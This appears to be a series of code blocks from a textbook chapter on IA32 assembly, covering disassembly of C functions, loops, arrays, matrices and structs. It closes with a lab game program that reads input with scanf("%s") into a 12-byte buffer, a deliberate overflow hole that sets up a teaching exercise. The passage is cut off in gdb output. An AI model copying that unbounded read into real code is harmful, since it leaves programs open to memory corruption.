["```\n$ uname -p\n\ni686\n```", "```\n$ sudo apt-get install libc6-dev-i386 gcc-multilib\n```", "```\n#include <stdio.h>\n\n//adds two to an integer and returns the result\n\nint adder2(int a) {\n\n    return a + 2;\n\n}\n\nint main(){\n\n    int x = 40;\n\n    x = adder2(x);\n\n    printf(\"x is: %d\\n\", x);\n\n    return 0;\n\n}\n```", "```\n$ gcc -m32 -o modified modified.c\n```", "```\n$ objdump -d modified > output\n\n$ less output\n```", "```\n0804840b <adder2>:\n\n 804840b:       55                      push   %ebp\n\n 804840c:       89 e5                   mov    %esp,%ebp\n\n 804840e:       8b 45 08                mov    0x8(%ebp),%eax\n\n 8048411:       83 c0 02                add    $0x2,%eax\n\n 8048414:       5d                      pop    %ebp\n\n 8048415:       c3                      ret\n```", "```\n\nmov    0x8(%ebp),%eax\n\nadd    $0x2,%eax\n```", "```\n//adds two to an integer and returns the result\n\nint adder2(int a) {\n\n    return a + 2;\n\n}\n```", "```\n\n0804840b <adder2>:\n\n 804840b:       55                      push   %ebp\n\n 804840c:       89 e5                   mov    %esp,%ebp\n\n 804840e:       8b 45 08                mov    0x8(%ebp),%eax\n\n 8048411:       83 c0 02                add    $0x2,%eax\n\n 8048414:       5d                      pop    %ebp\n\n 8048415:       c3                      ret\n\n```", "```\nsub $4,%esp\n\nmov %ebp,(%esp)\n```", "```\nmov (%esp),%ebp\n\nadd $4,%esp\n```", "```\npush %ebp\n\nmov %esp, %ebp\n```", "```\npop %ebp\n\nret\n```", "```\ntest %eax, %eax\n```", "```\ncmp $0, %eax\n```", "```\nint getSmallest(int x, int y) {\n\n    int smallest;\n\n    if ( x > y ) { //if (conditional)\n\n        smallest = y; //then statement\n\n    }\n\n else {\n\n        smallest = x; //else statement\n\n    }\n\n    return smallest;\n\n}\n```", "```\nint getSmallest(int x, int y) {\n\n    int smallest;\n\n    if (x <= y ) { //if (!conditional)\n\n        goto else_statement;\n\n    }\n\n    smallest = y; //then statement\n\n    goto done;\n\nelse_statement:\n\n    smallest = x; //else statement\n\ndone:\n\n    return smallest;\n\n}\n```", "```\n\nint getSmallest(int x, int y) {\n\n    int smallest;\n\n    if ( x > y ) {\n\n        smallest = y;\n\n    }\n\n    else {\n\n        smallest = x;\n\n    }\n\n    return smallest;\n\n}\n```", "```\n(gdb) disas getSmallest\n\nDump of assembler code for function getSmallest:\n\n  0x8048411 <+6>:   mov    0x8(%ebp),%eax\n\n  0x8048414 <+9>:   cmp    0xc(%ebp),%eax\n\n  0x8048417 <+12>:  jle    0x8048421 <getSmallest+22>\n\n  0x8048419 <+14>:  mov    0xc(%ebp),%eax\n\n  0x804841f <+20>:  jmp    0x8048427 <getSmallest+28>\n\n  0x8048421 <+22>:  mov    0x8(%ebp),%eax\n\n  0x8048427 <+28>:  ret\n```", "```\n0x8048411 <+6>:  mov 0x8(%ebp),%eax             #copy x to %eax\n\n0x8048414 <+9>:  cmp 0xc(%ebp),%eax             #compare x with y\n\n0x8048417 <+12>: jle 0x8048421 <getSmallest+22> #if x<=y goto<getSmallest+22>\n\n0x8048419 <+14>: mov 0xc(%ebp),%eax             #copy y to %eax\n\n0x804841f <+20>: jmp 0x8048427 <getSmallest+28> #goto <getSmallest+28>\n\n0x8048421 <+22>: mov 0x8(%ebp),%eax             #copy x to %eax\n\n0x8048427 <+28>: ret                            #exit function (return %eax)\n```", "```\nint getSmallest(int x, int y) {\n\n    int smallest;\n\n    if (x <= y) {\n\n        goto assign_x;\n\n    }\n\n    smallest = y;\n\n    goto done;\n\nassign_x:\n\n    smallest = x;\n\n done:\n\n    return smallest;\n\n}\n```", "```\nint getSmallest(int x, int y) {\n\n    int smallest;\n\n    if (x <= y) {\n\n        smallest = x;\n\n    }\n\n    else {\n\n        smallest = y;\n\n    }\n\n    return smallest;\n\n}\n```", "```\nif (<condition>) {\n\n    <then_statement>;\n\n}\n\nelse {\n\n    <else_statement>;\n\n}\n```", "```\n    if (!<condition>) {\n\n        goto else;\n\n    }\n\n    <then_statement>;\n\n    goto done;\n\nelse:\n\n    <else_statement>;\n\ndone:\n```", "```\n\nint getSmallest(int x, int y) {\n\n    int smallest;\n\n    if (x > y) {     //!(x <= y)\n\n        smallest = y; //then_statement\n\n    }\n\n    else {\n\n        smallest = x; //else_statement\n\n    }\n\n    return smallest;\n\n}\n```", "```\nresult = ( <condition>) ? <then_statement> : <else_statement>;\n```", "```\nint getSmallest_cmov(int x, int y) {\n\n return x > y ? y : x;\n\n}\n```", "```\n0x08048441 <+0>:   push   %ebp              #save ebp\n\n0x08048442 <+1>:   mov    %esp,%ebp         #update ebp\n\n0x08048444 <+3>:   mov    0xc(%ebp),%eax    #copy y to %eax\n\n0x08048447 <+6>:   cmp    %eax,0x8(%ebp)    #compare x with y\n\n0x0804844a <+9>:   cmovle 0x8(%ebp),%eax    #if (x <= y) copy x to %eax\n\n0x0804844e <+13>:  pop    %ebp              #restore %ebp\n\n0x0804844f <+14>:  ret                      #return %eax\n```", "```\nint incrementX(int * x) {\n\n    if (x != NULL) { //if x is not NULL\n\n        return (*x)++; //increment x\n\n    }\n\n    else { //if x is NULL\n\n        return 1; //return 1\n\n    }\n\n}\n```", "```\nint incrementX2(int * x){\n\n    return x ? (*x)++ : 1;\n\n}\n```", "```\n0x80484cf <+0>:   push   %ebp\n\n0x80484d0 <+1>:   mov    %esp,%ebp\n\n0x80484d2 <+3>:   cmpl   $0x0,0x8(%ebp)\n\n0x80484d6 <+7>:   je     0x80484e7 <incrementX2+24>\n\n0x80484d8 <+9>:   mov    0x8(%ebp),%eax\n\n0x80484db <+12>:  mov    (%eax),%eax\n\n0x80484dd <+14>:  lea    0x1(%eax),%ecx\n\n0x80484e0 <+17>:  mov    0x8(%ebp),%edx\n\n0x80484e3 <+20>:  mov    %ecx,(%edx)\n\n0x80484e5 <+22>:  jmp    0x80484ec <incrementX2+29>\n\n0x80484e7 <+24>:  mov    $0x1,%eax\n\n0x80484ec <+29>:  pop    %ebp\n\n0x80484ed <+30>:  ret\n```", "```\nint sumUp(int n) {\n\n    //initialize total and i\n\n    int total = 0;\n\n    int i = 1;\n\n    while (i <= n) {  //while i is less than or equal to n\n\n        total += i;   //add i to total\n\n        i+=1;          //increment i by 1\n\n }\n\n    return total;\n\n}\n```", "```\n(gdb) disas sumUp\n\nDump of assembler code for function sumUp:\n\n  0x804840b <+0>:   push   %ebp\n\n  0x804840c <+1>:   mov    %esp,%ebp\n\n  0x804840e <+3>:   sub    $0x10,%esp\n\n  0x8048411 <+6>:   movl   $0x0,-0x8(%ebp)\n\n  0x8048418 <+13>:  movl   $0x1,-0x4(%ebp)\n\n  0x804841f <+20>:  jmp    0x804842b <sumUp+32>\n\n  0x8048421 <+22>:  mov    -0x4(%ebp),%eax\n\n  0x8048424 <+25>:  add    %eax,-0x8(%ebp)\n\n  0x8048427 <+28>:  add   $0x1,-0x4(%ebp)\n\n  0x804842b <+32>:  mov    -0x4(%ebp),%eax\n\n  0x804842e <+35>:  cmp    0x8(%ebp),%eax\n\n  0x8048431 <+38>:  jle    0x8048421 <sumUp+22>\n\n  0x8048433 <+40>:  mov    -0x8(%ebp),%eax\n\n  0x8048436 <+43>:  leave\n\n  0x8048437 <+44>:  ret\n```", "```\n0x804840b <+0>:   push   %ebp                 # save ebp on stack\n\n0x804840c <+1>:   mov    %esp,%ebp            # update ebp (new stack frame)\n\n0x804840e <+3>:   sub    $0x10,%esp           # add 16 bytes to stack frame\n\n0x8048411 <+6>:   movl   $0x0,-0x8(%ebp)      # place 0 at ebp-0x8 (total)\n\n0x8048418 <+13>:  movl   $0x1,-0x4(%ebp)      # place 1 at ebp-0x4 (i)\n```", "```\n0x804841f <+20>:  jmp    0x804842b <sumUp+32>  # goto <sumUp+32>\n\n0x8048421 <+22>:  mov    -0x4(%ebp),%eax       # copy i to eax\n\n0x8048424 <+25>:  add    %eax,-0x8(%ebp)       # add i to total (total+=i)\n\n 0x8048427 <+28>:  add    $0x1,-0x4(%ebp)       # add 1 to i (i+=1)\n\n0x804842b <+32>:  mov    -0x4(%ebp),%eax       # copy i to eax\n\n0x804842e <+35>:  cmp    0x8(%ebp),%eax        # compare i with n\n\n0x8048431 <+38>:  jle    0x8048421 <sumUp+22>  # if (i <= n) goto <sumUp+22>\n```", "```\n<sumUp>:\n\n<+0>:   push   %ebp\n\n<+1>:   mov    %esp,%ebp\n\n<+3>:   sub    $0x10,%esp\n\n<+6>:   movl   $0x0,-0x8(%ebp)\n\n<+13>:  movl   $0x1,-0x4(%ebp)\n\n<+20>:  jmp    <sumUp+32>\n\n<+22>:  mov    -0x4(%ebp),%eax\n\n<+25>:  add    %eax,-0x8(%ebp)\n\n<+28>:  addl   $0x1,-0x4(%ebp)\n\n<+32>:  mov    -0x4(%ebp),%eax\n\n<+35>:  cmp    0x8(%ebp),%eax\n\n<+38>:  jle    <sumUp+22>\n\n<+40>:  mov    -0x8(%ebp),%eax\n\n<+43>:  leave\n\n<+44>:  ret\n```", "```\nint sumUp(int n) {\n\n    int total = 0;\n\n    int i = 1;\n\n    goto start;\n\nbody:\n\n    total += i;\n\n    i += 1;\n\nstart:\n\n    if (i <= n) {\n\n        goto body;\n\n    }\n\n    return total;\n\n}\n```", "```\nint sumUp(int n) {\n\n    int total = 0;\n\n    int i = 1;\n\n    while (i <= n) {\n\n        total += i;\n\n        i += 1;\n\n    }\n\n    return total;\n\n}\n```", "```\nint sumUp2(int n) {\n\n    int total = 0;             //initialize total to 0\n\n    int i;\n\n    for (i = 1; i <= n; i++) { //initialize i to 1, increment by 1 while i<=n\n\n        total += i;            //updates total by i\n\n    }\n\n    return total;\n\n}\n```", "```\n0x8048438 <+0>:  push   %ebp                  # save ebp\n\n0x8048439 <+1>:  mov    %esp,%ebp             # update ebp (new stack frame)\n\n0x804843b <+3>:  sub    $0x10,%esp            # add 16 bytes to stack frame\n\n0x804843e <+6>:  movl   $0x0,-0x8(%ebp)       # place 0 at ebp-0x8 (total)\n\n 0x8048445 <+13>: movl   $0x1,-0x4(%ebp)       # place 1 at ebp-0x4 (i)\n\n0x804844c <+20>: jmp    0x8048458 <sumUp2+32> # goto <sumUp2+32>\n\n0x804844e <+22>: mov    -0x4(%ebp),%eax       # copy i to %eax\n\n0x8048451 <+25>: add    %eax,-0x8(%ebp)       # add %eax to total (total+=i)\n\n0x8048454 <+28>: addl   $0x1,-0x4(%ebp)       # add 1 to i (i+=1)\n\n0x8048458 <+32>: mov    -0x4(%ebp),%eax       # copy i to %eax\n\n0x804845b <+35>: cmp    0x8(%ebp),%eax        # compare i with n\n\n0x804845e <+38>: jle    0x804844e <sumUp2+22> # if (i <= n) goto <sumUp2+22>\n\n0x8048460 <+40>: mov    -0x8(%ebp),%eax       # copy total to %eax\n\n0x8048463 <+43>: leave                        # prepare to leave the function\n\n0x8048464 <+44>: ret                          # return total\n```", "```\nfor ( <initialization>; <boolean expression>; <step> ){\n\n    <body>\n\n}\n```", "```\n<initialization>\n\nwhile (<boolean expression>) {\n\n    <body>\n\n    <step>\n\n}\n```", "```\nint sumUp2(int n) {\n\n    int total = 0;\n\n    int i = 1;\n\n    for (i; i <= n; i++) {\n\n        total += i;\n\n    }\n\n    return total;\n\n}\n```", "```\nint sumUp(int n){\n\n    int total = 0;\n\n    int i = 1;\n\n    while (i <= n) {\n\n        total += i;\n\n        i += 1;\n\n }\n\n    return total;\n\n}\n```", "```\n#include <stdio.h>\n\nint assign(){\n\n    int y = 40;\n\n    return y;\n\n}\n\nint adder(){\n\n    int a;\n\n    return a + 2;\n\n}\n\nint main(){\n\n    int x;\n\n    assign();\n\n    x = adder();\n\n    printf(\"x is: %d\\n\", x);\n\n    return 0;\n\n}\n```", "```\n804840d <assign>:\n\n 804840d:       55                      push   %ebp\n\n 804840e:       89 e5                   mov    %esp,%ebp\n\n 8048410:       83 ec 10                sub    $0x10,%esp\n\n 8048413:       c7 45 fc 28 00 00 00    movl   $0x28,-0x4(%ebp)\n\n 804841a:       8b 45 fc                mov    -0x4(%ebp),%eax\n\n 804841d:       c9                      leave\n\n 804841e:       c3                      ret\n\n0804841f <adder>:\n\n 804841f:       55                      push   %ebp\n\n 8048420:       89 e5                   mov    %esp,%ebp\n\n 8048422:       83 ec 10                sub    $0x10,%esp\n\n 8048425:       8b 45 fc                mov    -0x4(%ebp),%eax\n\n 8048428:       83 c0 02                add    $0x2,%eax\n\n 804842b:       c9                      leave\n\n 804842c:       c3                      ret\n\n0804842d <main>:\n\n 804842d:       55                      push   %ebp\n\n 804842e:       89 e5                   mov    %esp,%ebp\n\n 8048433:       83 ec 20                sub    $0x14,%esp\n\n 8048436:       e8 d2 ff ff ff          call   804840d <assign>\n\n 804843b:       e8 df ff ff ff          call   804841f <adder>\n\n 8048440:       89 44 24 1c             mov    %eax,0xc(%esp)\n\n 8048444:       8b 44 24 1c             mov    0xc(%esp),%eax\n\n 8048448:       89 44 24 04             mov    %eax,0x4(%esp)\n\n 804844c:       c7 04 24 f4 84 04 08    movl   $0x80484f4,(%esp)\n\n 8048453:       e8 88 fe ff ff          call   80482e0 <printf@plt>\n\n 8048458:       b8 00 00 00 00          mov    $0x0,%eax\n\n 804845d:       c9                      leave\n\n 804845e:       c3                      ret\n```", "```\nmov %ebp, %esp\n\npop %ebp\n```", "```\nint a;\n\nreturn a + 2;\n```", "```\nint printf(const char * format, ...)\n```", "```\nprintf(\"x is %d\\n\", x);\n```", "```\nint sumDown(int n) {\n\n    int total = 0;\n\n    int i = n;\n\n    while (i > 0) {\n\n        total += i;\n\n        i--;\n\n    }\n\n    return total;\n\n}\n```", "```\nint sumr(int n) {\n\n    if (n <= 0) {\n\n        return 0;\n\n    }\n\n    return n + sumr(n-1);\n\n}\n```", "```\n0x0804841d <+0>:  push  %ebp                  # save ebp\n\n0x0804841e <+1>:  mov   %esp,%ebp             # update ebp (new stack frame)\n\n0x08048420 <+3>:  sub   $0x8,%esp             # add 8 bytes to stack frame\n\n0x08048423 <+6>:  cmp   $0x0,0x8(%ebp)        # compare ebp+8 (n) with 0\n\n0x08048427 <+10>: jg    0x8048430 <sumr+19>   # if (n > 0), goto <sumr+19>\n\n0x08048429 <+12>: mov   $0x0,%eax             # copy 0 to eax (result)\n\n0x0804842e <+17>: jmp   0x8048443 <sumr+38>   # goto <sumr+38>\n\n0x08048430 <+19>: mov   0x8(%ebp),%eax        # copy n to eax (result)\n\n0x08048433 <+22>: sub   $0x1,%eax             # subtract 1 from n (result--)\n\n0x08048436 <+25>: mov   %eax,(%esp)           # copy n-1 to top of stack\n\n0x08048439 <+28>: call  0x804841d <sumr>      # call sumr() function\n\n0x0804843e <+33>: mov   0x8(%ebp),%edx        # copy n to edx\n\n0x08048441 <+36>: add   %edx,%eax             # add n to result (result+=n)\n\n0x08048443 <+38>: leave                       # prepare to leave the function\n\n0x08048444 <+39>: ret                         # return result\n```", "```\nint sumr(int n) {\n\n    int result;\n\n    if (n > 0) {\n\n        goto body;\n\n    }\n\n result = 0;\n\n    goto done;\n\nbody:\n\n    result = n;\n\n    result -= 1;\n\n    result = sumr(result);\n\n    result += n;\n\ndone:\n\n    return result;\n\n}\n```", "```\nint sumr(int n) {\n\n    int result;\n\n    if (n <= 0) {\n\n        return 0;\n\n    }\n\n    result = sumr(n-1);\n\n    result += n;\n\n    return result;\n\n}\n```", "```\nint sumArray(int *array, int length) {\n\n    int i, total = 0;\n\n for (i = 0; i < length; i++) {\n\n        total += array[i];\n\n    }\n\n    return total;\n\n}\n```", "```\n<sumArray>:\n\n <+0>:  push %ebp                    # save ebp\n\n <+1>:  mov  %esp,%ebp               # update ebp (new stack frame)\n\n <+3>:  sub  $0x10,%esp              # add 16 bytes to stack frame\n\n <+6>:  movl $0x0,-0x8(%ebp)         # copy 0 to %ebp-8 (total)\n\n <+13>: movl $0x0,-0x4(%ebp)         # copy 0 to %ebp-4 (i)\n\n <+20>: jmp  0x80484ab <sumArray+46> # goto <sumArray+46> (start)\n\n <+22>: mov  -0x4(%ebp),%eax         # copy i to %eax\n\n <+25>: lea  0x0(,%eax,4),%edx       # copy i*4 to %edx\n\n <+32>: mov  0x8(%ebp),%eax          # copy array to %eax\n\n <+35>: add  %edx,%eax               # copy array+i*4 to %eax\n\n <+37>: mov  (%eax),%eax             # copy *(array+i*4) to %eax\n\n <+39>: add  %eax,-0x8(%ebp)         # add *(array+i*4) to total\n\n <+42>: addl $0x1,-0x4(%ebp)         # add 1 to i\n\n <+46>: mov  -0x4(%ebp),%eax         # copy i to %eax\n\n <+49>: cmp  0xc(%ebp),%eax          # compare i with length\n\n <+52>: jl   0x8048493 <sumArray+22> # if i<length goto <sumArray+22> (loop)\n\n <+54>: mov  -0x8(%ebp),%eax         # copy total to eax\n\n <+57>: leave                        # prepare to leave the function\n\n <+58>: ret                          # return total\n```", "```\n\n<+22>: mov  -0x4(%ebp),%eax      # copy i to %eax\n\n<+25>: lea  0x0(,%eax,4),%edx    # copy i*4 to %edx\n\n<+32>: mov  0x8(%ebp),%eax       # copy array to %eax\n\n<+35>: add  %edx,%eax            # copy array+i*4 to %eax\n\n<+37>: mov  (%eax),%eax          # copy *(array+i*4) to %eax\n\n<+39>: add  %eax,-0x8(%ebp)      # add *(array+i*4) to total (total+=array[i])\n```", "```\n//statically allocated matrix (allocated on stack)\n\nint M1[4][3];\n\n//dynamically allocated matrix (programmer friendly, allocated on heap)\n\nint **M2, i;\n\nM2 = malloc(4 * sizeof(int*));\n\nfor (i = 0; i < 4; i++) {\n\n    M2[i] = malloc(3 * sizeof(int));\n\n}\n```", "```\n//dynamic matrix (allocated on heap, memory efficient way)\n\n#define ROWS 4\n\n#define COLS 3\n\nint *M3;\n\nM3  = malloc(ROWS * COLS * sizeof(int));\n```", "```\nint sumMat(int *m, int rows, int cols) {\n\n    int i, j, total = 0;\n\n    for (i = 0; i < rows; i++){\n\n        for (j = 0; j < cols; j++){\n\n            total += m[i*cols + j];\n\n        }\n\n    }\n\n    return total;\n\n}\n```", "```\n<sumMat>:\n\n0x08048507 <+0>:  push %ebp                  # save ebp\n\n0x08048508 <+1>:  mov  %esp,%ebp             # update ebp (new stack frame)\n\n0x0804850a <+3>:  sub  $0x10,%esp            # add 4 more spaces to stack frame\n\n0x0804850d <+6>:  movl $0x0,-0xc(%ebp)       # copy 0 to ebp-12 (total)\n\n0x08048514 <+13>: movl $0x0,-0x4(%ebp)       # copy 0 to ebp-4 (i)\n\n0x0804851b <+20>: jmp  0x8048555 <sumMat+78> # goto <sumMat+78>\n\n0x0804851d <+22>: movl $0x0,-0x8(%ebp)       # copy 0 to ebp-8 (j)\n\n0x08048524 <+29>: jmp  0x8048549 <sumMat+66> # goto <sumMat+66>\n\n0x08048526 <+31>: mov  -0x4(%ebp),%eax       # copy i to eax\n\n0x08048529 <+34>: imul 0x10(%ebp),%eax       # multiply i * cols, place in eax\n\n0x0804852d <+38>: mov  %eax,%edx             # copy i*cols to edx\n\n0x0804852f <+40>: mov  -0x8(%ebp),%eax       # copy j to %eax\n\n0x08048532 <+43>: add  %edx,%eax             # add i*cols with j, place in eax\n\n0x08048534 <+45>: lea  0x0(,%eax,4),%edx     # mult (i*cols+j) by 4,put in edx\n\n0x0804853b <+52>: mov  0x8(%ebp),%eax        # copy m pointer to eax\n\n0x0804853e <+55>: add  %edx,%eax             # add m to (i*cols+j)*4,put in eax\n\n0x08048540 <+57>: mov  (%eax),%eax           # copy m[i*cols+j] to eax\n\n0x08048542 <+59>: add  %eax,-0xc(%ebp)       # add eax to total\n\n0x08048545 <+62>: addl $0x1,-0x8(%ebp)       # increment j by 1 (j+=1)\n\n0x08048549 <+66>: mov  -0x8(%ebp),%eax       # copy j to eax\n\n0x0804854c <+69>: cmp  0x10(%ebp),%eax       # compare j with cols\n\n0x0804854f <+72>: jl   0x8048526 <sumMat+31> # if (j < cols) goto <sumMat+31>\n\n0x08048551 <+74>: addl $0x1,-0x4(%ebp)       # add 1 to i (i+=1)\n\n0x08048555 <+78>: mov  -0x4(%ebp),%eax       # copy i to eax\n\n0x08048558 <+81>: cmp  0xc(%ebp),%eax        # compare i with rows\n\n0x0804855b <+84>: jl   0x804851d <sumMat+22> # if (i < rows) goto sumMat+22\n\n0x0804855d <+86>: mov  -0xc(%ebp),%eax       # copy total to eax\n\n0x08048560 <+89>: leave                      # prepare to leave the function\n\n0x08048561 <+90>: ret                        # return total\n```", "```\n0x08048526 <+31>: mov  -0x4(%ebp),%eax    # copy i to eax\n\n0x08048529 <+34>: imul 0x10(%ebp),%eax    # multiply i with cols, place in eax\n\n0x0804852d <+38>: mov  %eax,%edx          # copy i*cols to edx\n```", "```\n0x0804852f <+40>: mov -0x8(%ebp),%eax   # copy j to eax\n\n0x08048532 <+43>: add %edx,%eax         # add i*cols with j, place in eax\n\n0x08048534 <+45>: lea 0x0(,%eax,4),%edx # multiply (i*cols+j) by 4, put in edx\n```", "```\n0x0804853b <+52>: mov 0x8(%ebp),%eax    # copy m pointer to eax\n\n0x0804853e <+55>: add %edx,%eax         # add m to (i*cols+j)*4, place in eax\n\n0x08048540 <+57>: mov (%eax),%eax       # copy m[i*cols+j] to eax\n\n0x08048542 <+59>: add %eax,-0xc(%ebp)   # add eax to total\n```", "```\nint sumMatrix(int **matrix, int rows, int cols) {\n\n    int i, j, total=0;\n\n    for (i = 0; i < rows; i++) {\n\n        for (j = 0; j < cols; j++) {\n\n            total += matrix[i][j];\n\n        }\n\n    }\n\n    return total;\n\n}\n```", "```\n0x080484ad <+0>:  push %ebp                     # save ebp\n\n0x080484ae <+1>:  mov  %esp,%ebp                # update ebp (new stack frame)\n\n0x080484b0 <+3>:  sub  $0x10,%esp               # add 4 spaces to stack frame\n\n0x080484b3 <+6>:  movl $0x0,-0xc(%ebp)          # copy 0 to %ebp-12 (total)\n\n0x080484ba <+13>: movl $0x0,-0x4(%ebp)          # copy 0 to %ebp-4 (i)\n\n0x080484c1 <+20>: jmp  0x80484fa <sumMatrix+77> # goto <sumMatrix+77>\n\n0x080484c3 <+22>: movl $0x0,-0x8(%ebp)          # copy 0 to %ebp-8 (j)\n\n0x080484ca <+29>: jmp  0x80484ee <sumMatrix+65> # goto <sumMatrix+65>\n\n 0x080484cc <+31>: mov  -0x4(%ebp),%eax          # copy i to %eax\n\n0x080484cf <+34>: lea  0x0(,%eax,4),%edx        # mult i by 4, place in %edx\n\n0x080484d6 <+41>: mov  0x8(%ebp),%eax           # copy matrix to %eax\n\n0x080484d9 <+44>: add  %edx,%eax                # put (i * 4) + matrix in %eax\n\n0x080484db <+46>: mov  (%eax),%eax              # copy matrix[i] to %eax\n\n0x080484dd <+48>: mov  -0x8(%ebp),%edx          # copy j to %edx\n\n0x080484e0 <+51>: shl  $0x2,%edx                # mult j by 4, place in %edx\n\n0x080484e3 <+54>: add  %edx,%eax                # put (j*4)+matrix[i] in %eax\n\n0x080484e5 <+56>: mov  (%eax),%eax              # copy matrix[i][j] to %eax\n\n0x080484e7 <+58>: add  %eax,-0xc(%ebp)          # add matrix[i][j] to total\n\n0x080484ea <+61>: addl $0x1,-0x8(%ebp)          # add 1 to j (j+=1)\n\n0x080484ee <+65>: mov  -0x8(%ebp),%eax          # copy j to %eax\n\n0x080484f1 <+68>: cmp  0x10(%ebp),%eax          # compare j with cols\n\n0x080484f4 <+71>: jl   0x80484cc <sumMatrix+31> # if j<cols goto<sumMatrix+31>\n\n0x080484f6 <+73>: addl $0x1,-0x4(%ebp)          # add 1 to i (i+=1)\n\n0x080484fa <+77>: mov  -0x4(%ebp),%eax          # copy i to %eax\n\n0x080484fd <+80>: cmp  0xc(%ebp),%eax           # compare i with rows\n\n0x08048500 <+83>: jl   0x80484c3 <sumMatrix+22> # if i<rows goto<sumMatrix+22>\n\n0x08048502 <+85>: mov  -0xc(%ebp),%eax          # copy total to %eax\n\n0x08048505 <+88>: leave                         # prepare to leave function\n\n0x08048506 <+89>: ret                           # return total\n```", "```\n0x080484cc <+31>: mov -0x4(%ebp),%eax      # copy i to %eax\n\n0x080484cf <+34>: lea 0x0(,%eax,4),%edx    # multiply i by 4, place in %edx\n\n0x080484d6 <+41>: mov 0x8(%ebp),%eax       # copy matrix to %eax\n\n0x080484d9 <+44>: add %edx,%eax            # add i*4 to matrix, place in %eax\n\n0x080484db <+46>: mov (%eax),%eax          # copy matrix[i] to %eax\n```", "```\n0x080484dd <+48>: mov -0x8(%ebp),%edx    # copy j to %edx\n\n0x080484e0 <+51>: shl $0x2,%edx          # multiply j by 4, place in %edx\n\n0x080484e3 <+54>: add %edx,%eax          # add j*4 to matrix[i], place in %eax\n\n0x080484e5 <+56>: mov (%eax),%eax        # copy matrix[i][j] to %eax\n\n0x080484e7 <+58>: add %eax,-0xc(%ebp)    # add matrix[i][j] to total\n```", "```\nstruct studentT {\n\n    char name[64];\n\n    int  age;\n\n    int  grad_yr;\n\n    float gpa;\n\n};\n\nstruct studentT student;\n```", "```\nvoid initStudent(struct studentT *s, char *nm, int ag, int gr, float g) {\n\n    strncpy(s->name, nm, 64);\n\n    s->grad_yr = gr;\n\n    s->age = ag;\n\n    s->gpa = g;\n\n}\n```", "```\n<initStudent>:\n\n <+0>:   push  %ebp                     # save ebp\n\n <+1>:   mov   %esp,%ebp                # update ebp (new stack frame)\n\n <+3>:   sub   $0x18,%esp               # add 24 bytes to stack frame\n\n <+6>:   mov   0x8(%ebp),%eax           # copy first parameter (s) to eax\n\n <+9>:   mov   0xc(%ebp),%edx           # copy second parameter (nm) to edx\n\n <+12>   mov   $0x40,0x8(%esp)          # copy 0x40 (or 64) to esp+8\n\n <+16>:  mov   %edx,0x4(%esp)           # copy nm to esp+4\n\n <+20>:  mov   %eax,(%esp)              # copy s to top of stack (esp)\n\n <+23>:  call  0x8048320 <strncpy@plt>  # call strncpy(s->name, nm, 64)\n\n <+28>:  mov   0x8(%ebp),%eax           # copy s to eax\n\n <+32>:  mov   0x14(%ebp),%edx          # copy fourth parameter (gr) to edx\n\n <+35>:  mov   %edx,0x44(%eax)          # copy gr to offset eax+68 (s->grad_yr)\n\n <+38>:  mov   0x8(%ebp),%eax           # copy s to eax\n\n <+41>:  mov   0x10(%ebp),%edx          # copy third parameter (ag) to edx\n\n <+44>:  mov   %edx,0x40(%eax)          # copy ag to offset eax+64 (s->age)\n\n <+47>:  mov   0x8(%ebp),%edx           # copy s to edx\n\n <+50>:  mov   0x18(%ebp),%eax          # copy g to eax\n\n <+53>:  mov   %eax,0x48(%edx)          # copy g to offset edx+72 (s->gpa)\n\n <+56>:  leave                          # prepare to leave the function\n\n <+57>:  ret                            # return\n```", "```\n <+6>:   mov   0x8(%ebp),%eax           # copy first parameter (s) to eax\n\n <+9>:   mov   0xc(%ebp),%edx           # copy second parameter (nm) to edx\n\n <+12>   mov   $0x40,0x8(%esp)          # copy 0x40 (or 64) to esp+8\n\n <+16>:  mov   %edx,0x4(%esp)           # copy nm to esp+4\n\n <+20>:  mov   %eax,(%esp)              # copy s to top of stack (esp)\n\n <+23>:  call  0x8048320 <strncpy@plt>  # call strncpy(s->name, nm, 64)\n```", "```\n <+28>:  mov   0x8(%ebp),%eax           # copy s to eax\n\n <+32>:  mov   0x14(%ebp),%edx          # copy fourth parameter (gr) to edx\n\n <+35>:  mov   %edx,0x44(%eax)          # copy gr to offset eax+68 (s->grad_yr\n```", "```\n <+38>:  mov   0x8(%ebp),%eax           # copy s to eax\n\n <+41>:  mov   0x10(%ebp),%edx          # copy third parameter (ag) to edx\n\n <+44>:  mov   %edx,0x40(%eax)          # copy ag to offset eax+64 (s->age)\n\n <+47>:  mov   0x8(%ebp),%edx           # copy s to edx\n\n <+50>:  mov   0x18(%ebp),%eax          # copy g to eax\n\n <+53>:  mov   %eax,0x48(%edx)          # copy g to offset edx+72 (s->gpa)\n```", "```\nstruct studentTM {\n\n    char name[63]; //updated to 63 instead of 64\n\n    int  age;\n\n    int  grad_yr;\n\n    float gpa;\n\n};\n\nstruct studentTM student2;\n```", "```\nstruct studentTM {\n\n    int  age;\n\n    int  grad_yr;\n\n    float gpa;\n\n    char name[63];\n\n};\n\nstruct studentTM student3;\n```", "```\n$ tar -xzvf secret.tar.gz\n```", "```\n#include <stdio.h>\n\n#include <stdlib.h>\n\n#include \"other.h\" //contains secret function definitions\n\n/*prints out the You Win! message*/\n\nvoid endGame(void) {\n\n    printf(\"You win!\\n\");\n\n    exit(0);\n\n}\n\n/*main function of the game*/\n\nint main() {\n\n    int guess, secret, len;\n\n    char buf[12]; //buffer (12 bytes long)\n\n    printf(\"Enter secret number:\\n\");\n\n    scanf(\"%s\", buf); //read guess from user input\n\n    guess = atoi(buf); //convert to an integer\n\n    secret = getSecretCode(); //call the getSecretCode() function\n\n    //check to see if guess is correct\n\n    if (guess == secret) {\n\n        printf(\"You got it right!\\n\");\n\n    }\n\n    else {\n\n printf(\"You are so wrong!\\n\");\n\n        return 1; //if incorrect, exit\n\n    }\n\n    printf(\"Enter the secret string to win:\\n\");\n\n    scanf(\"%s\", buf); //get secret string from user input\n\n    guess = calculateValue(buf, strlen(buf)); //call calculateValue function\n\n    //check to see if guess is correct\n\n    if (guess != secret){\n\n        printf(\"You lose!\\n\");\n\n        return 2; //if guess is wrong, exit\n\n    }\n\n    /*if both the secret string and number are correct\n\n    call endGame()*/\n\n    endGame();\n\n    return 0;\n\n}\n```", "```\n   0x08048582 <+0>:     push   %ebp\n\n   0x08048583 <+1>:     mov    %esp,%ebp\n\n   0x08048588 <+6>:     sub    $0x38,%esp\n\n   0x0804858b <+9>:     movl   $0x8048707,(%esp)\n\n   0x08048592 <+16>:    call   0x8048390 <printf@plt>\n\n 0x08048597 <+21>:    lea    0x1c(%esp),%eax\n\n   0x0804859b <+25>:    mov    %eax,0x4(%esp)\n\n=> 